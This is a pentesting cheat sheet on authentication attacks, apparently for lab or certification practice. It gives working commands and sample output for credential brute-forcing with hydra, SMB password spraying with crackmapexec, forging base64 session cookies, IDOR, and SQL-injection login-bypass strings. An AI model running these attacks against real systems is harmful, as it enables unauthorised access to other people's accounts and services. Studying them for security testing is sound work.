# AUTHENTICATION ATTACKS

### Default credentials

Try known defaults first — Always the first thing to try

```bash
admin:admin, admin:password, root:root
Google: '<application> default credentials'
```

<details>
<summary>Example Output</summary>

```
admin:admin -> 'Login successful'
OR: admin:password -> 'Welcome, Administrator'
(Always try these FIRST before brute forcing)
```
</details>

---

### Brute force login

HTTP form brute force — Get exact form fields from Burp

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'
```

<details>
<summary>Example Output</summary>

```
hydra -l admin -P rockyou.txt 10.10.10.5 pop3
[110][pop3] login: admin password: welcome1
(Crack mail credentials)
```
</details>

---

### Password spray

One password, many users — Avoids lockouts

```bash
crackmapexec smb $IP -u users.txt -p 'Password1' --continue-on-success
```

<details>
<summary>Example Output</summary>

```
crackmapexec smb 10.10.10.5 -u users.txt -p 'Password1'
[-] corp\admin:Password1
[-] corp\john:Password1
[+] corp\jane:Password1
(One hit across many users)
```
</details>

---

### Session hijacking

JWT, base64 encoded tokens — Weak session management

```bash
Check cookies for session tokens, try to decode/forge
```

<details>
<summary>Example Output</summary>

```
Cookie: session=eyJhZG1pbiI6ZmFsc2V9
base64 decode: {"admin":false}
Change to: {"admin":true}
base64 encode: eyJhZG1pbiI6dHJ1ZX0=
Set cookie and refresh -> Admin access!
```
</details>

---

### Registration / password reset

Create test@test.com — Sometimes leads to admin access

```bash
Register a new account, look for IDOR or priv escalation
```

<details>
<summary>Example Output</summary>

```
Register: testuser@test.com
Login -> see profile page
Change URL: /profile?id=1 (was id=5)
Now viewing admin's profile = IDOR
OR: Reset admin password via manipulated token
```
</details>

---

### SQL injection on login

Bypass authentication — Classic SQLi login bypass

```bash
admin' OR 1=1-- -
admin'-- -
```

<details>
<summary>Example Output</summary>

```
Username: admin'-- -
Password: anything

Result: Logged in as admin
(Authentication bypassed via SQLi)
```
</details>

---
